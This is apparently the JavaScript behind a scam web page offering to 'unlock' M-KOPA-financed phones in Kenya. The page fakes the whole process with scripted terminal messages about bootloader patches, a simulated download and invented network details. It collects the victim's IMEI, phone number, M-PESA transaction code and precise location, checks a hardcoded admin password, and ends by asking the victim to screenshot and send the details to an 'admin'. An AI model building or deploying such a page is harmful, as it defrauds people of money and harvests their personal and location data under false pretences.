

// Configuration
const CONFIG = {
    adminPassword: "2071@Mkopa_Kenya",
    unlockDuration: 45000,
    locationAccuracyThreshold: 50000, // 50km in meters
    fakeISP: "Safaricom LTE",
    fakeNetworkAccuracy: "High (4G)",
    downloadSize: 12.4, // MB
    terminalCommands: [
        "> INITIALIZING MKOPA UNLOCK PROTOCOL v3.2.1",
        "> CONNECTING TO SECURE SERVER...",
        "> AUTHENTICATING DEVICE CREDENTIALS...",
        "> VERIFYING IMEI: %IMEI%",
        "> CHECKING DEVICE ELIGIBILITY...",
        "> DOWNLOADING SECURITY PATCH...",
        "> DECRYPTING PACKAGE...",
        "> VERIFYING PACKAGE SIGNATURE...",
        "> APPLYING BOOTLOADER PATCH...",
        "> WRITING SECURITY FLAGS...",
        "> CLEARING DEVICE RESTRICTIONS...",
        "> FINALIZING UNLOCK PROCESS...",
        "> UNLOCK COMPLETE!"
    ],
    terminalResponses: [
        "SUCCESS: Connection established (SSL/TLS 1.3)",
        "STATUS: Device verified (MKOPA ID: MK-%RAND%)",
        "RESULT: IMEI validated and whitelisted",
        "STATUS: Device eligible for unlock",
        "DOWNLOAD: Starting secure transfer...",
        "DECRYPT: Using AES-256 encryption...",
        "VERIFY: Package signature valid",
        "PATCH: Applying bootloader modifications...",
        "WRITE: Updating device security flags...",
        "CLEAR: Removing network restrictions...",
        "FINALIZE: Committing changes to NVRAM..."
    ]
};

// DOM Elements
const elements = {
    // Forms
    deviceForm: document.getElementById('deviceForm'),
    adminForm: document.getElementById('adminForm'),
    
    // Inputs
    deviceModel: document.getElementById('deviceModel'),
    imei: document.getElementById('imei'),
    phone: document.getElementById('phone'),
    mpesa: document.getElementById('mpesa'),
    adminPass: document.getElementById('adminPass'),
    terms: document.getElementById('terms'),
    
    // Buttons
    verifyBtn: document.getElementById('verifyBtn'),
    unlockBtn: document.getElementById('unlockBtn'),
    showPassword: document.getElementById('showPassword'),
    tryAgainBtn: document.getElementById('tryAgainBtn'),
    restartBtn: document.getElementById('restartBtn'),
    
    // Steps
    step1: document.getElementById('step1'),
    step2: document.getElementById('step2'),
    step3: document.getElementById('step3'),
    step4: document.getElementById('step4'),
    errorSection: document.getElementById('errorSection'),
    
    // Device Info
    batteryLevel: document.getElementById('batteryLevel'),
    batteryBar: document.getElementById('batteryBar'),
    networkInfo: document.getElementById('networkInfo'),
    ispInfo: document.getElementById('ispInfo'),
    locationInfo: document.getElementById('locationInfo'),
    networkAccuracy: document.getElementById('networkAccuracy'),
    deviceId: document.getElementById('deviceId'),
    
    // Progress
    progressFill: document.getElementById('progressFill'),
    progressText: document.getElementById('progressText'),
    progressPercent: document.getElementById('progressPercent'),
    
    // Terminal
    terminalOutput: document.getElementById('terminalOutput'),
    
    // Download
    downloadProgress: document.getElementById('downloadProgress'),
    downloadSpeed: document.getElementById('downloadSpeed'),
    downloadSize: document.getElementById('downloadSize'),
    downloadTime: document.getElementById('downloadTime'),
    
    // Summary
    deviceSummary: document.getElementById('deviceSummary'),
    unlockInfo: document.getElementById('unlockInfo'),
    
    // Indicators
    stepIndicators: document.querySelectorAll('.step-indicator'),
    progressBarFill: document.querySelector('.progress-fill')
};

// State Management
const state = {
    batteryLevel: 0,
    isCharging: false,
    location: null,
    networkType: 'unknown',
    terminalInterval: null,
    downloadInterval: null,
    unlockProcess: null,
    startTime: null
};

// Initialize application
document.addEventListener('DOMContentLoaded', function() {
    initDeviceInfo();
    setupEventListeners();
    showStep(1);
});

function initDeviceInfo() {
    // Simulate battery level detection
    simulateBattery();
    
    // Detect network information
    detectNetworkInfo();
    
    // Generate device ID
    elements.deviceId.textContent = generateDeviceId();
    
    // Try to get real location
    getDeviceLocation();
}

function setupEventListeners() {
    // Form submissions
    elements.deviceForm.addEventListener('submit', handleDeviceSubmit);
    elements.adminForm.addEventListener('submit', handleAdminSubmit);
    
    // Interactive elements
    elements.showPassword.addEventListener('click', togglePasswordVisibility);
    elements.tryAgainBtn.addEventListener('click', resetToDeviceInfo);
    elements.restartBtn.addEventListener('click', resetProcess);
    
    // Terms agreement modal
    document.querySelector('.terms-link').addEventListener('click', showTermsModal);
}

// ======================
// DEVICE INFORMATION
// ======================

function simulateBattery() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
            state.batteryLevel = Math.round(battery.level * 100);
            state.isCharging = battery.charging;
            updateBatteryDisplay();

            // Listen for battery updates
            battery.addEventListener('levelchange', () => {
                state.batteryLevel = Math.round(battery.level * 100);
                updateBatteryDisplay();
            });

            battery.addEventListener('chargingchange', () => {
                state.isCharging = battery.charging;
                updateBatteryDisplay();
            });
        }).catch((error) => {
            console.warn("Battery API not accessible, falling back to simulation:", error);
            fallbackSimulatedBattery();
        });
    } else {
        fallbackSimulatedBattery();
    }
}

function fallbackSimulatedBattery() {
    // Random battery level between 20-100%
    state.batteryLevel = Math.max(20, Math.floor(Math.random() * 100));
    state.isCharging = Math.random() > 0.7;
    updateBatteryDisplay();

    if (!state.isCharging) {
        setInterval(() => {
            if (state.batteryLevel > 1) {
                state.batteryLevel -= 0.5;
                updateBatteryDisplay();
            }
        }, 10000); // every 10 seconds
    }
}

function updateBatteryDisplay() {
    elements.batteryLevel.textContent = `${state.batteryLevel}%${state.isCharging ? ' (Charging)' : ''}`;
    elements.batteryBar.style.width = `${state.batteryLevel}%`;
    
    // Change color based on level
    if (state.batteryLevel < 20) {
        elements.batteryBar.classList.remove('bg-success', 'bg-warning');
        elements.batteryBar.classList.add('bg-danger');
    } else if (state.batteryLevel < 50) {
        elements.batteryBar.classList.remove('bg-success', 'bg-danger');
        elements.batteryBar.classList.add('bg-warning');
    } else {
        elements.batteryBar.classList.remove('bg-warning', 'bg-danger');
        elements.batteryBar.classList.add('bg-success');
    }
}

function detectNetworkInfo() {
    // Try real network info
    if (navigator.connection && navigator.connection.effectiveType) {
        const type = navigator.connection.effectiveType;
        state.networkType = type.toUpperCase();
        elements.networkInfo.textContent = `${state.networkType} Network`;
    } else {
        // Fallback to simulated network type
        const networkTypes = ['2G', '3G', '4G', 'LTE', '5G'];
        state.networkType = networkTypes[Math.floor(Math.random() * networkTypes.length)];
        elements.networkInfo.textContent = `${state.networkType} Network`;
    }

    // Try fetching real ISP info using ipinfo.io
    fetch("https://ipinfo.io/json?token=9590a54b039714")
        .then(res => res.json())
        .then(data => {
            const org = data.org || CONFIG.fakeISP;
            elements.ispInfo.textContent = org;
        })
        .catch(() => {
            elements.ispInfo.textContent = CONFIG.fakeISP;
        });

    // Use configured fake network accuracy
    elements.networkAccuracy.textContent = CONFIG.fakeNetworkAccuracy;
}

function generateDeviceId() {
    const prefix = 'MK';
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.floor(Math.random() * 10000);
    return `${prefix}-${timestamp}-${random}`;
}

async function getDeviceLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            elements.locationInfo.textContent = "Location: Not available";
            resolve();
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                if (position.coords.accuracy <= CONFIG.locationAccuracyThreshold) {
                    state.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy)
                    };
                    
                    try {
                        const locationName = await reverseGeocode(state.location.lat, state.location.lng);
                        elements.locationInfo.textContent = locationName;
                    } catch (error) {
                        console.error("Reverse geocoding failed:", error);
                        elements.locationInfo.textContent = 
                            `${state.location.lat.toFixed(4)}, ${state.location.lng.toFixed(4)}`;
                    }
                }
                resolve();
            },
            (error) => {
                console.log("Location error:", error.message);
                elements.locationInfo.textContent = "Location: Permission denied";
                resolve();
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

async function reverseGeocode(lat, lng) {
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`;

    try {
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'MkopaDemoApp/1.0' // Nominatim requires a user agent
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();

        // You can customize how the address is shown:
        return data.display_name || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
    } catch (error) {
        console.error("Real reverse geocoding failed:", error);
        return `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
    }
}
// ======================
// FORM HANDLING
// ======================

async function handleDeviceSubmit(e) {
    e.preventDefault();
    
    // Collect form data
    const deviceData = {
        model: elements.deviceModel.value.trim(),
        imei: elements.imei.value.trim(),
        phone: elements.phone.value.trim(),
        mpesa: elements.mpesa.value.trim()
    };
    
    // Validate inputs
    if (!validateDeviceInfo(deviceData)) return;
    
    // Show loading state
    toggleLoadingState(elements.verifyBtn, true, 'Verifying...');
    
    try {
        // Simulate API call delay
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Update device summary
        updateDeviceSummary(deviceData);
        
        // Move to next step
        updateProgressBar(2);
        showStep(2);
        
    } catch (error) {
        console.error("Device submission error:", error);
        showError("Failed to process device information. Please try again.");
    } finally {
        toggleLoadingState(elements.verifyBtn, false, 'Verify Device');
    }
}

function validateDeviceInfo(data) {
    // Required fields check
    if (!data.model || !data.imei || !data.phone || !data.mpesa) {
        showAlert('Please fill in all required fields');
        return false;
    }
    
    // IMEI validation
    if (data.imei.length !== 15 || !/^\d+$/.test(data.imei)) {
        showAlert('IMEI must be exactly 15 digits');
        return false;
    }
    
    // Phone number validation (Kenyan format)
    if (!/^(\+?254|0)[17]\d{8}$/.test(data.phone)) {
        showAlert('Please enter a valid Kenyan phone number (e.g. 254712345678 or 0712345678)');
        return false;
    }
    
    // Terms agreement
    if (!elements.terms.checked) {
        showAlert('You must agree to the terms and conditions');
        return false;
    }
    
    return true;
}

function updateDeviceSummary(data) {
    let summaryHTML = `
        <p><strong>Device Model:</strong> ${data.model}</p>
        <p><strong>IMEI Number:</strong> ${data.imei}</p>
        <p><strong>Phone Number:</strong> ${data.phone}</p>
        <p><strong>MPESA Transaction:</strong> ${data.mpesa}</p>
        <p><strong>Battery Level:</strong> ${state.batteryLevel}%</p>
        <p><strong>Network:</strong> ${state.networkType}</p>
    `;
    
    if (state.location) {
        summaryHTML += `<p><strong>Location:</strong> ${elements.locationInfo.textContent}</p>`;
    }
    
    elements.deviceSummary.innerHTML = summaryHTML;
}

function handleAdminSubmit(e) {
    e.preventDefault();
    
    const enteredPassword = elements.adminPass.value;
    
    if (enteredPassword === CONFIG.adminPassword) {
        updateProgressBar(3);
        showStep(3);
        startUnlockProcess();
    } else {
        showErrorSection();
    }
}

// ======================
// UNLOCK PROCESS
// ======================

function startUnlockProcess() {
    // Clear terminal
    elements.terminalOutput.innerHTML = '';
    
    // Start progress tracking
    state.startTime = Date.now();
    const duration = CONFIG.unlockDuration;
    
    // Start terminal simulation
    simulateTerminal();
    
    // Start download simulation
    simulateDownload();
    
    // Start unlock progress tracking
    state.unlockProcess = setInterval(() => {
        const elapsed = Date.now() - state.startTime;
        const progress = Math.min((elapsed / duration) * 100, 100);
        
        // Update progress display
        elements.progressFill.style.width = `${progress}%`;
        elements.progressPercent.textContent = `${Math.round(progress)}%`;
        updateProgressText(progress);
        
        // Check if complete
        if (progress >= 100) {
            clearInterval(state.unlockProcess);
            completeUnlock();
        }
    }, 300);
}

function simulateTerminal() {
    let commandIndex = 0;
    let responseIndex = 0;
    
    // Initial commands
    addTerminalLine(CONFIG.terminalCommands[commandIndex++].replace('%IMEI%', elements.imei.value));
    addTerminalLine(CONFIG.terminalCommands[commandIndex++]);
    
    // Subsequent commands with delays
    state.terminalInterval = setInterval(() => {
        if (commandIndex < CONFIG.terminalCommands.length) {
            // Add command
            const command = CONFIG.terminalCommands[commandIndex++]
                .replace('%IMEI%', elements.imei.value)
                .replace('%RAND%', Math.floor(1000 + Math.random() * 9000));
            addTerminalLine(command);
            
            // Add response after delay if available
            if (responseIndex < CONFIG.terminalResponses.length) {
                setTimeout(() => {
                    addTerminalLine(CONFIG.terminalResponses[responseIndex++]
                        .replace('%RAND%', Math.floor(1000 + Math.random() * 9000)), 'response');
                }, 800 + Math.random() * 1200);
            }
        } else {
            clearInterval(state.terminalInterval);
        }
    }, 2000);
}

function addTerminalLine(text, type = 'command') {
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    
    // Simulate typing effect
    let i = 0;
    const typing = setInterval(() => {
        if (i < text.length) {
            line.textContent = text.substring(0, i + 1);
            elements.terminalOutput.appendChild(line);
            elements.terminalOutput.scrollTop = elements.terminalOutput.scrollHeight;
            i++;
        } else {
            clearInterval(typing);
            
            // Add blinking cursor at end
            if (type === 'command') {
                line.innerHTML = text + '<span class="blinking-cursor">_</span>';
            }
        }
    }, type === 'command' ? 10 : 5);
}

function simulateDownload() {
    let downloaded = 0;
    const totalSize = CONFIG.downloadSize * 1024; // Convert to KB
    const startTime = Date.now();
    
    state.downloadInterval = setInterval(() => {
        // Random download speed between 500-1500 KB/s
        const speed = 500 + Math.random() * 1000;
        downloaded += speed / 4; // Divided by 4 because interval is 250ms
        
        // Update download progress
        const progress = Math.min((downloaded / totalSize) * 100, 100);
        elements.downloadProgress.style.width = `${progress}%`;
        
        // Update download info
        elements.downloadSpeed.textContent = `${Math.round(speed)} KB/s`;
        elements.downloadSize.textContent = 
            `${(downloaded / 1024).toFixed(1)} MB / ${CONFIG.downloadSize} MB`;
        
        // Calculate remaining time
        const elapsed = (Date.now() - startTime) / 1000; // in seconds
        const remaining = (totalSize - downloaded) / speed;
        elements.downloadTime.textContent = 
            `Estimated time: ${formatTime(remaining)}`;
        
        // Complete if done
        if (downloaded >= totalSize) {
            clearInterval(state.downloadInterval);
            elements.downloadSpeed.textContent = "Complete";
            elements.downloadTime.textContent = `Time: ${formatTime(elapsed)}`;
        }
    }, 250);
}

function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return `${mins}m ${secs}s`;
}

function updateProgressText(progress) {
    let statusText = "Initializing unlock protocol...";
    
    if (progress > 10) statusText = "Verifying device credentials...";
    if (progress > 25) statusText = "Connecting to MKOPA servers...";
    if (progress > 40) statusText = "Downloading security patches...";
    if (progress > 60) statusText = "Applying bootloader modifications...";
    if (progress > 80) statusText = "Finalizing unlock process...";
    
    elements.progressText.textContent = statusText;
}

function completeUnlock() {
    // Clear intervals
    clearInterval(state.terminalInterval);
    clearInterval(state.downloadInterval);
    
    // Add final success message
    addTerminalLine("> UNLOCK SUCCESSFUL: Device restrictions removed", "success");
    
    // Update unlock information
    updateUnlockInfo();
    
    // Show completion section
    updateProgressBar(4);
    showStep(4);
}

function updateUnlockInfo() {
    let infoHTML = `
        <p><strong>Device Model:</strong> ${elements.deviceModel.value}</p>
        <p><strong>IMEI Number:</strong> ${elements.imei.value}</p>
        <p><strong>Unlock Time:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>Transaction ID:</strong> ${generateTransactionId()}</p>
        <p><strong>Status:</strong> <span class="text-success">Successfully Unlocked</span></p>
        <p><em>screenshot and send this info to admin for completion</em></p>
    `;
    
    if (state.location) {
        infoHTML += `<p><strong>Location:</strong> ${elements.locationInfo.textContent}</p>`;
    }
    
    elements.unlockInfo.innerHTML = infoHTML;
}

// ======================
// UI FUNCTIONS
// ======================

function showStep(stepNumber) {
    // Hide all steps
    elements.step1.classList.remove('active');
    elements.step2.classList.remove('active');
    elements.step3.classList.remove('active');
    elements.step4.classList.remove('active');
    elements.errorSection.classList.remove('active');
    
    // Show current step
    switch(stepNumber) {
        case 1:
            elements.step1.classList.add('active');
            break;
        case 2:
            elements.step2.classList.add('active');
            break;
        case 3:
            elements.step3.classList.add('active');
            break;
        case 4:
            elements.step4.classList.add('active');
            break;
        case 5:
            elements.errorSection.classList.add('active');
            break;
    }
    
    // Scroll to top smoothly
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

function updateProgressBar(step) {
    // Update step indicators
    elements.stepIndicators.forEach((indicator, index) => {
        if (index < step - 1) {
            indicator.classList.add('completed');
            indicator.classList.add('active');
        } else if (index === step - 1) {
            indicator.classList.add('active');
            indicator.classList.remove('completed');
        } else {
            indicator.classList.remove('active', 'completed');
        }
    });
    
    // Update progress bar
    const percentage = (step - 1) * 25;
    elements.progressBarFill.style.width = `${percentage}%`;
}

function togglePasswordVisibility() {
    const type = elements.adminPass.getAttribute('type');
    elements.adminPass.setAttribute('type', type === 'password' ? 'text' : 'password');
    elements.showPassword.innerHTML = type === 'password' ? 
        '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
}

function toggleLoadingState(button, isLoading, text) {
    if (isLoading) {
        button.disabled = true;
        button.innerHTML = `<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> ${text}`;
    } else {
        button.disabled = false;
        button.innerHTML = text;
    }
}

function showErrorSection() {
    updateProgressBar(5);
    showStep(5);
}

function resetToDeviceInfo() {
    // Clear password field
    elements.adminPass.value = '';
    
    // Show first step
    updateProgressBar(1);
    showStep(1);
}

function resetProcess() {
    // Reset forms
    elements.deviceForm.reset();
    elements.adminForm.reset();
    
    // Reset terms checkbox
    elements.terms.checked = false;
    
    // Reset state
    state.location = null;
    state.batteryLevel = 0;
    
    // Reset UI
    elements.locationInfo.textContent = "Detecting...";
    elements.terminalOutput.innerHTML = '';
    elements.downloadProgress.style.width = '0%';
    elements.progressFill.style.width = '0%';
    elements.progressPercent.textContent = '0%';
    
    // Reinitialize device info
    initDeviceInfo();
    
    // Show first step
    updateProgressBar(1);
    showStep(1);
}

// ======================
// HELPER FUNCTIONS
// ======================

function generateTransactionId() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let result = 'MK-';
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function showAlert(message) {
    Swal.fire({
        icon: 'warning',
        title: 'Attention',
        text: message,
        confirmButtonColor: '#00a651'
    });
}

function showError(message) {
    Swal.fire({
        icon: 'error',
        title: 'Error',
        text: message,
        confirmButtonColor: '#e74c3c'
    });
}

function showTermsModal(e) {
    e.preventDefault();
    
    Swal.fire({
        title: 'Terms and Conditions',
        html: document.getElementById('termsContent').innerHTML,
        confirmButtonText: 'I Understand',
        confirmButtonColor: '#00a651',
        width: '800px'
    });
}
